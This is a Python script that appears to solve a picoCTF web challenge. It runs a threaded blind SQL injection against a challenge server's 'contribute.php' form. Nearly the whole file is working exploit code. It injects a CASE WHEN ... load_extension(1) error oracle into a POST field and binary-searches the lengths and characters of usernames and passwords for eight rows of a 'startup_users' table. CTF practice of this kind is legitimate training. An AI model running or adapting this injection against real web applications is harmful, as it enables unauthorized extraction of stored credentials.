import requests
from utils.pretty_print import pretty_print
from concurrent.futures import ThreadPoolExecutor
import string

url = "http://wily-courier.picoctf.net:65033/contribute.php"
cookie = {"PHPSESSID":"d88487e473ccfd64de993d1917f4f422"}

characters = string.ascii_letters + string.digits + "{}_"
charset = "".join(sorted(characters))

#threads... bc wtf.

#find the table row password's len (i being OFFSET)
#binary search
def find_passlen(i):
    left = 1
    right = 50
    while(left<=right):
        m = int((left+right)/2)
        substr_len_pass = f"(SELECT length(wordpass) FROM startup_users LIMIT 1 OFFSET {i})>={m}"
        qstring = f"1' AND CASE WHEN ({substr_len_pass}) THEN 1 ELSE load_extension(1) END;--"
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        if current:
            pos = m
            left = m + 1
        else:
            right = m - 1
    return pos
    
def find_userlen(i):
    left = 1
    right = 30
    while(left<=right):
        m = int((left+right)/2)
        substr_len_pass = f"(SELECT length(nameuser) FROM startup_users LIMIT 1 OFFSET {i})>={m}"
        qstring = f"1' AND CASE WHEN ({substr_len_pass}) THEN 1 ELSE load_extension(1) END;--"
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        if current:
            pos = m
            left = m + 1
        else:
            right = m - 1
    return pos
    
def find_passchar(i, k):
#find entry k's letter i of the password
    left = 0
    right = len(charset) - 1
    while(left<=right):
        m = int((left+right)/2)
        c = charset[m]
        substr_pass = f"(SELECT hex(substr(wordpass,{i},1)) FROM startup_users LIMIT 1 OFFSET {k}) >= HEX('{c}')"
        qstring = f"1' AND CASE WHEN ({substr_pass}) THEN 1 ELSE load_extension(1) END;--"
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        
        if current:
            pos = c
            left = m+1
        else:
            right=m-1
    return pos
    
def find_userchar(i, k):
#find entry k's letter i of the password
    left = 0
    right = len(charset) - 1
    while(left<=right):
        m = int((left+right)/2)
        c = charset[m]
        substr_pass = f"(SELECT hex(substr(nameuser,{i},1)) FROM startup_users LIMIT 1 OFFSET {k}) >= HEX('{c}')"
        qstring = f"1' AND CASE WHEN ({substr_pass}) THEN 1 ELSE load_extension(1) END;--"
        data = {
            "moneys": qstring
        }
        res = requests.post(url, data=data, cookies=cookie)
        current = False if 'not authorized' in res.text else True
        
        if current:
            pos = c
            left = m+1
        else:
            right=m-1
    return pos
    
def find_pass_user(k):
    #first find len, then for each char of the len have a thread find it
    #we have 8 entries
    passlen = find_passlen(k)
    userlen = find_userlen(k)
    print(f"Found password length {passlen} and username length {userlen} for {k}th user.")
    with ThreadPoolExecutor(max_workers=30) as executor:
        results_pass = list(executor.map(lambda i: find_passchar(i, k), range(1, passlen+1)))
        results_user = list(executor.map(lambda i: find_userchar(i, k), range(1, userlen+1)))
    password = ''.join(results_pass)
    username = ''.join(results_user)
    print(f"Found password {password} and {username} for the {k}th user.")
    
    
#for each user, make a thread; dar user merge de la k, indexat de la 0

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(find_pass_user, range(0,8))

